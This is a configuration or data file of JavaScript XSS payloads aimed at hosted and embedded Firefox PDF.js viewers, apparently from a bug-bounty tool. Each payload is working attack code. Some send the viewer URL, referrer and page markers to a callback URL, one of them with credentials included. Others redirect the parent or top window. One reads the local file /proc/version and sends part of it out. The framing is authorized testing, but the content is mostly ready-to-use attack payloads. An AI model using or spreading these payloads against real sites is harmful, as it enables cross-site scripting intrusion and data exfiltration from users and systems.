metadata.name: Firefox PDF.js / hosted viewer probes
metadata.description: Curated Firefox/PDF.js payloads for hosted-viewer SBX validation, parent/viewer boundary checks, and controlled callback proof in practical bug-bounty workflows.
sbx_focus: hosted PDF.js and upload-preview viewer-context probes
parent/top boundary checks before any noisier browser-generic payloads
controlled callback and blind validation paths for reproducible evidence
local resource reachability only after viewer-context proof succeeds
research_highlights: Hosted PDF.js and stale hosted viewer deployments are the clearest modern file-based XSS target path
Parent/viewer boundary proof and blind callback evidence are more useful than generic alert or DOM graffiti payloads
Upload preview, admin review, and embedded viewer flows should be tested before speculative renderer-only tricks
deprioritized_patterns: storage or geolocation abuse unrelated to hosted PDF.js boundaries
speculative SpiderMonkey gadget chains without viewer-specific proof

preconditions: Target uses Firefox PDF.js or a hosted/embedded pdf.js viewer path
A controlled callback endpoint is available for validation

payloads.payload: try { if (typeof parent !== 'undefined' && parent !== window && parent.location) { parent.location.assign('{url}?probe=pdfjs-parent-assign&viewer=' + encodeURIComponent(location.href)); } } catch (e) { console.log('PDF.js parent assign blocked:', e); }
payloads.description: High-signal parent navigation probe for hosted PDF.js viewers.

payloads.payload: try { if (typeof top !== 'undefined' && top !== window && top.location) { top.location = '{url}?probe=pdfjs-top-nav&viewer=' + encodeURIComponent(location.href); } } catch (e) { console.log('PDF.js top navigation blocked:', e); }
payloads.description: Top-window boundary check for embedded PDF.js viewers when parent assignment is filtered.

payloads.payload: try { if (typeof parent !== 'undefined' && parent !== window && parent.postMessage) { parent.postMessage({ pdfjsProbe: 'viewer-boundary', viewerHref: location.href, referrer: document.referrer || '', embedded: parent !== window }, '*'); } } catch (e) { console.log('PDF.js postMessage blocked:', e); }
payloads.description: Viewer-to-parent bridge probe for hosted PDF.js integrations and wrapper apps.

payloads.payload: try { var q = 'probe=pdfjs-beacon&href=' + encodeURIComponent(location.href) + '&referrer=' + encodeURIComponent(document.referrer || '') + '&embedded=' + (parent !== window); if (navigator.sendBeacon) { navigator.sendBeacon('{url}?' + q, 'pdfjs=1'); } else { fetch('{url}?' + q, { mode: 'no-cors', method: 'POST', body: 'pdfjs=1' }); } } catch (e) { console.log('PDF.js blind callback blocked:', e); }
payloads.description: Controlled blind callback for viewer-context proof without depending on visible execution.

payloads.payload: try { var markers = ['#viewer', '#viewerContainer', '#toolbarViewer'].filter(function (sel) { return !!document.querySelector(sel); }).length; fetch('{url}?probe=pdfjs-upload-preview&href=' + encodeURIComponent(location.href) + '&referrer=' + encodeURIComponent(document.referrer || '') + '&markers=' + markers + '&embedded=' + (parent !== window), { mode: 'no-cors', credentials: 'include' }); } catch (e) { console.log('PDF.js upload preview callback blocked:', e); }
payloads.description: Blind callback tuned for upload-preview and admin-review flows that host PDF.js inline.

payloads.payload: try { var markers = ['#viewer', '#viewerContainer', '#toolbarViewer'].filter(function (sel) { return !!document.querySelector(sel); }).join(','); fetch('{url}?probe=pdfjs-hosted-viewer&markers=' + encodeURIComponent(markers) + '&href=' + encodeURIComponent(location.href), { mode: 'no-cors' }); } catch (e) { console.log('PDF.js hosted viewer marker probe blocked:', e); }
payloads.description: Hosted-viewer fingerprinting probe to confirm pdf.js context before deeper SBX checks.

payloads.payload: try { fetch('file:///proc/version').then(function (r) { return r.text(); }).then(function (d) { return fetch('{url}?probe=pdfjs-local-file&ok=1&sample=' + encodeURIComponent(d.slice(0, 120)), { mode: 'no-cors' }); }).catch(function () { return fetch('{url}?probe=pdfjs-local-file&ok=0', { mode: 'no-cors' }); }); } catch (e) { console.log('PDF.js local file probe blocked:', e); }
payloads.description: Late-stage local resource reachability check for Firefox PDF.js after viewer proof succeeds.

payloads.payload: try { var sameOrigin = false; try { sameOrigin = !!(parent !== window && parent.location && parent.location.origin === location.origin); } catch (inner) { sameOrigin = false; } fetch('{url}?probe=pdfjs-parent-origin&sameOrigin=' + sameOrigin + '&href=' + encodeURIComponent(location.href) + '&referrer=' + encodeURIComponent(document.referrer || ''), { mode: 'no-cors' }); } catch (e) { console.log('PDF.js parent origin probe blocked:', e); }
payloads.description: Parent/viewer same-origin boundary check for hosted PDF.js and embedded preview routes.
